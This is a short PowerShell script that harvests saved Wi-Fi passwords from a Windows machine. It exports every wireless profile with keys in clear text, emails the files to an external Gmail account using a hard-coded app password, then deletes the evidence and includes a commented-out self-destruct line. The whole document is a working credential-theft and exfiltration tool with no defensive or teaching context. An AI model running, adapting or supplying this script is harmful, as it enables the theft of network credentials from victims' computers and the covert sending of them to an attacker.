#create directory
mkdir .creds

#send wifi Profiles to directory
netsh wlan export profile folder= .creds key=clear

#Use email to send files
$From = "KiddyTheScript@gmail.com"
$To = "KiddyTheScript@gmail.com"
$Attachment = (get-childitem ".\.creds").fullname #adds each file in .creds folder to attachment variable
$Subject = "creds"
$Body = "Meow Meow"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$secpasswd = ConvertTo-SecureString "rhznsrbplaffeeao" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("KiddyTheScript@gmail.com", $secpasswd)
Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl -From $from -To $To -Subject $Subject -Attachments $Attachment -Body $Body

#Delete folder
del -r .creds

#Self Destruct Script from pc
#Remove-Item WiFiCreds.ps1 -Force 
